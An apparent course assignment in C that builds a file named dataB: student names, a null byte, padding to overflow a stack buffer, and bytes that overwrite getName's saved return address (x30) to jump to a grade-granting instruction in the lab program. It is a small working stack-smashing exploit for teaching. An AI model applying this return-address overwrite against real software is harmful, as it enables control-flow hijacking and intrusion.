/*--------------------------------------------------------------------*/
/* File: createdataB.c                                                */
/*                                                                    */
/* Function: Produces a file called dataB with the student name,      */
/* a nullbyte, padding to overrun the stack, and the address          */
/* of the instruction in main to get a B, the latter of which will    */
/* overwrite getName's stored x30.                                    */
/*                                                                    */
/* Names: Alex Delistathis, Matthew Zhang                             */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* Accepts a string of characters as a command-line argument. Writes
   the string of characters to the dataB file. Returns 0. */
int main(void) {

   /* create a file pointer and iterator variable */
   FILE *dataB;

   /* open the file */
   dataB = fopen("dataB", "w+");

   /* write names to file */ 
   fprintf(dataB, "Alex Delistathis & Matthew Zhang");

   /* write null byte to file */
   putc('\0', dataB);
   
   /* overrun the stack */
   fprintf(dataB, "%s", "angangangangang");

   /* write target address to file */
   fprintf(dataB, "%c", 0x90);
   fprintf(dataB, "%c", 0x08);
   fprintf(dataB, "%c", 0x40);
   
   /* close file */
   fclose(dataB);

   return 0;
}
   